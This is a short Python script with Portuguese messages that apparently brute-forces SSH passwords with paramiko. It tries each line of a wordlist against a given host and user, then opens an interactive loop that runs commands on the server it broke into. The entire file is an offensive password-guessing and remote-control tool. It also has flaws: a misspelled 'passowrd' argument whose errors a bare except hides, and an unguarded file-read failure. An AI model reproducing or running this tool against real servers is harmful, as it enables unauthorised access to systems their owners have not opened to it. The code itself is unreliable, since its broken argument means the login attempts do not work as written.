import paramiko
import sys

host = sys.argv[1]
user = sys.argv[2]
try:
    arquivo = open(sys.argv[3],'rt')
    linhas = arquivo.readlines()
except:
    print('Erro ao ler o arquivo')
for linha in linhas:
    try:
        fim = len(linha)
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, passowrd=linha[0:fim - 1])
        print("[+] Senha Correta ! >> ", linha)
    except:
        print('[-] Erro não foi encontrada a senha')

while True:
    try:
        comando = input("Comando: ")
        entrada, saida, erros = client.exec_command(comando)
        print(saida.readlines())
        print(erros.readlines())
    except:
        print('[-]Erro ao tentar conectar no servidor')
        break
